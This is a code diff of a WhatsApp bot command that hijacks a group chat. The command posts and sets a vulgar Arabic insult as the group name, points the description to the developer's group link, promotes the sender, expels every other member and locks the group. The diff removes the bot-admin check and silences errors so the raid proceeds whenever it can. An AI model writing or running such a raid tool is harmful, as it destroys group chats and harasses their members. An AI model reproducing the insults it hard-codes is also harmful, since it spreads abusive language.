@@ -1,16 +1,26 @@
-const handler = async (m, { conn, isBotAdmin }) => {
+const handler = async (m, { conn }) => {
   const from = m.chat;
 
   if (!m.isGroup) return m.reply("❌ الأمر للمجموعات فقط");
-  if (!isBotAdmin) return m.reply("❌ البوت لازم يكون مشرف");
+
+  // ─── الرسائل بتتبعت دايماً حتى لو البوت مش أدمن ───
+  await conn.sendMessage(from, { text: "*_تم سحب البار براعايه كريزي ي كسمك وجاري طرد الكل 🫦_*" });
+
+  // ─── عمليات الأدمن: بتشتغل لو البوت أدمن، وإلا بتتخطى ───
+  try {
+    await conn.groupUpdateSubject(from, "تم السحب برعاية كريزي ي كسمك 🫦");
+  } catch {}
 
   try {
-    await conn.sendMessage(from, { text: "*_تم سحب البار براعايه كريزي ي كسمك وجاري طرد الكل 🫦_*" });
-
-    await conn.groupUpdateSubject(from, "تم السحب برعاية كريزي ي كسمك 🫦");
     await conn.groupUpdateDescription(from, `لينك جروب المطور 🔥👇\nhttps://chat.whatsapp.com/CDa5fFK3mLhHJYMLxHBQey?s=cl&p=a&mlu=1`);
-    await conn.groupParticipantsUpdate(from, [m.sender], "promote");
+  } catch {}
 
+  try {
+    await conn.groupParticipantsUpdate(from, [m.sender], "promote");
+  } catch {}
+
+  // ─── طرد الأعضاء ───
+  try {
     let metadata = await conn.groupMetadata(from);
     let participants = metadata.participants;
     let botId = conn.user.id.split(":")[0] + "@s.whatsapp.net";
@@ -20,26 +30,26 @@ const handler = async (m, { conn, isBotAdmin }) => {
         try {
           await conn.groupParticipantsUpdate(from, [participant.id], "remove");
           await new Promise((resolve) => setTimeout(resolve, 800));
-        } catch (e) {
-          console.log("فشل طرد:", participant.id);
-        }
+        } catch {}
       }
     }
+  } catch {}
 
+  try {
     await conn.groupSettingUpdate(from, "announcement");
+  } catch {}
+
+  try {
     await conn.groupSettingUpdate(from, "locked");
+  } catch {}
 
-    await conn.sendMessage(from, { text: "*_تم سحب الجروب وطرد الجميع بنجاح 🫦_*" });
-
-  } catch (err) {
-    console.error(err);
-    m.reply("❌ حدث خطأ أثناء تنفيذ العملية");
-  }
+  await conn.sendMessage(from, { text: "*_تم سحب الجروب وطرد الجميع بنجاح 🫦_*" });
 };
 
-handler.help = ["سحب"];
-handler.tags = ["owner"];
+handler.help    = ["سحب"];
+handler.tags    = ["owner"];
 handler.command = /^(سحب|sahb)$/i;
-handler.owner = true;
+handler.owner   = true;
+handler.group   = true;
 
 export default handler;
